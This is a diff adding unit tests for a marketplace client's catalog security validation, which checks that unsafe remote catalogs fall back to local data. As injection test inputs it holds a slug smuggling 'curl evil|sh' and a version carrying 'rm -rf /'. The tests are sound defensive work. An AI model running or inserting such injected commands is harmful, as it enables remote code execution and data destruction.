@@ -237,3 +237,90 @@ describe('marketplace/client groupByCategory', () => {
     expect(groupByCategory([]).size).toBe(0);
   });
 });
+
+describe('marketplace/client fetchCatalog 安全校验（S1）', () => {
+  /** 构造单个 item 的最小 catalog，字段可覆盖（默认全部合法） */
+  function makeCatalog(itemOverrides: Record<string, unknown>): Catalog {
+    return {
+      version: '9.9',
+      updatedAt: '2026-01-01T00:00:00Z',
+      items: [
+        {
+          id: 'x-1',
+          type: 'agent',
+          slug: 'x-agent',
+          name: 'X Agent',
+          version: '1.0.0',
+          author: 'tester',
+          description: 'a testing agent',
+          readme: '# X',
+          tags: ['test'],
+          category: 'dev',
+          iconEmoji: '🧪',
+          verificationStatus: 'community',
+          downloadUrl: '',
+          checksum: '',
+          sizeBytes: 1,
+          installCount: 0,
+          ...itemOverrides,
+        },
+      ],
+    };
+  }
+
+  /** 期望远程 catalog 被判为不可信 → 回退本地内置（5 items / version 1.0） */
+  async function expectLocalFallback(catalog: unknown): Promise<void> {
+    fetchSpy.mockResolvedValue({
+      ok: true,
+      status: 200,
+      json: async () => catalog,
+    } as Response);
+    const result = await fetchCatalog('https://example.test/catalog.json');
+    expect(result.version).toBe('1.0');
+    expect(result.items).toHaveLength(5);
+  }
+
+  it('item.slug 含 shell 元字符 → 远程 catalog 整体拒绝，回退本地', async () => {
+    await expectLocalFallback(makeCatalog({ slug: 'x"$(curl evil|sh)"' }));
+  });
+
+  it('item.version 含 shell 元字符 → 回退本地', async () => {
+    await expectLocalFallback(makeCatalog({ version: '1.0; rm -rf /' }));
+  });
+
+  it('item.type 非法枚举 → 回退本地', async () => {
+    await expectLocalFallback(makeCatalog({ type: 'evil' }));
+  });
+
+  it('downloadUrl 非 https → 回退本地', async () => {
+    await expectLocalFallback(
+      makeCatalog({ downloadUrl: 'http://evil.test/pkg.tar.gz' }),
+    );
+  });
+
+  it('checksum 非 sha256 hex → 回退本地', async () => {
+    await expectLocalFallback(
+      makeCatalog({ downloadUrl: 'https://ok.test/pkg.tar.gz', checksum: 'not-hex!' }),
+    );
+  });
+
+  it('items 非数组 → 回退本地', async () => {
+    await expectLocalFallback({ version: '9.9', updatedAt: 'x', items: 'nope' });
+  });
+
+  it('合法远程 catalog（https downloadUrl + sha256 checksum）→ 正常返回远程内容', async () => {
+    fetchSpy.mockResolvedValue({
+      ok: true,
+      status: 200,
+      json: async () =>
+        makeCatalog({
+          downloadUrl: 'https://ok.test/pkg.tar.gz',
+          checksum: 'a'.repeat(64),
+        }),
+    } as Response);
+    const catalog = await fetchCatalog('https://example.test/catalog.json');
+    expect(catalog.version).toBe('9.9');
+    expect(catalog.items).toHaveLength(1);
+    expect(catalog.items[0]!.slug).toBe('x-agent');
+  });
+});
